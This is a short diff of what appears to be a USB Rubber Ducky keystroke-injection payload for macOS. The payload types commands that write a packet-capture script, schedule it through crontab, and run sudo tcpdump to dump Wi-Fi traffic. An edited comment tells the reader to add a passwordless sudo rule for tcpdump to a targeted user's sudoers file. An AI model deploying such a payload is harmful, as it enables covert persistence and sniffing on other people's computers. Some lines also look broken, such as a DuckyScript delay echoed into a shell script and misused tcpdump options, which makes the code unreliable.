@@ -26,7 +26,7 @@ REM Save the script to a file in the current directory
 STRING touch infinitydump.sh
 ENTER
 DELAY 1000
-STRING echo "/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport -s; sudo tcpdump -n -i en1 -vvv -E 'wlan.fc.type_subtype == 0x08' -w infinitydump.pcap &" >> infinitydump.sh
+STRING echo "sudo tcpdump -n -i en1 -vvv -E 'wlan.fc.type_subtype == 0x08' -w infinitydump.pcap &" >> infinitydump.sh
 ENTER
 DELAY 1000
 STRING echo "DELAY 60000" >> infinitydump.sh
@@ -48,7 +48,7 @@ DELAY 1000
 STRING crontab cronjob
 ENTER
 DELAY 1000
-REM Execute airport -s command to list available Wi-Fi networks, print the SSIDs, and dump the packets of the host to a file. 
+REM Execute a passwordless sudo tcpsump by modifying the sudoers file then dump the packets of the host to a file.  this is the the addition that must be added to the sudoers file <USERNAME> ALL=(ALL) NOPASSWD: /usr/bin/tcpdump    replace <USERNAME> with the username of the targeted user.
 REM we use the '-w' in place of the '>' operator here because '>' gives sends a pcap that wireshark cannot read , '-w' resolves the issue.
 STRING /System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport -s; sudo tcpdump -n -i en1 -vvv -E 'wlan.fc.type_subtype == 0x08' -w infinitydump.pcap &
 ENTER
